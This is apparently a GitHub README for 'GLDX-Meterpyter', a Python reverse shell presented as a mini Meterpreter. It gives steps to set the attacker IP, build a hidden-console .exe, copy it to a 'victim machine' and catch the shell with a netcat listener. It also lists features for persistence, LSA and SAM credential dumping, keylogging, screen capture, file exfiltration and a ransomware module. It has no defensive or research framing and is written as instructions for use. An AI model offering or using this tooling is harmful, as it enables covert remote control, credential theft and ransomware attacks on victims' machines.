# GLDX-Meterpyter
Reverse Shell made in python / Acting as a Mini Meterpreter version 

## Installation / Execution

You first need to change LHOST IP Adress in Meterpyter.py
<img width="457" height="46" alt="image" src="https://github.com/user-attachments/assets/23a350ef-5491-4bc2-9945-45b65bdd9ba3" />


### Using it with Python (3.14)
Copy Meterpyter.py to your victim machine
 - pip install -r requirements
 - python .\Meterpyter.py

### Using .exe
You need a Windows Environnement to compile it to .exe
 - pip install PyInstaller
 - PyInstaller --noconsole --onefile .\Meterpyter.py --clean

Then, copy dist/Meterpyter.exe to your victim machine and double click

### Execution 
On your attacking machine
 - nc -lvnp 4444 (or whatever port you want to change to)
<img width="325" height="24" alt="image" src="https://github.com/user-attachments/assets/ee18ffa9-7b33-40d7-96a7-6ccf564a5942" />


You now should have an opened reverse shell

## Usage
First, you can type help to display the full commands menu
Some of them are not implemented yet, but you can still use :
 - Basic commands
   - cd
   - cat (powershell)
   - exit
   - help
     
 - Recon & Discovery
   - sysinfo
   - netstat
     
 - File Operation
   - search <path> <filename>
   - download
   - upload
   - zipupload (not zipdownload)

 - Persistence Mechanisms
   - addschedule
   - addstartup

 - Process & Service Management
   - ps

 - Credential Dump
   - lsadump
   - samdump

 - External Modules Management (Fully)

 - User Control
   - getscreen
   - startkeylogger
   - stopkeylogger

 - Ransomware Module
   - startransom or startransom <path> (NOT startransomware)
   - stopransom or stopransom <path> (NOT stopransomware)

 - Open Terminal
   - Powershell


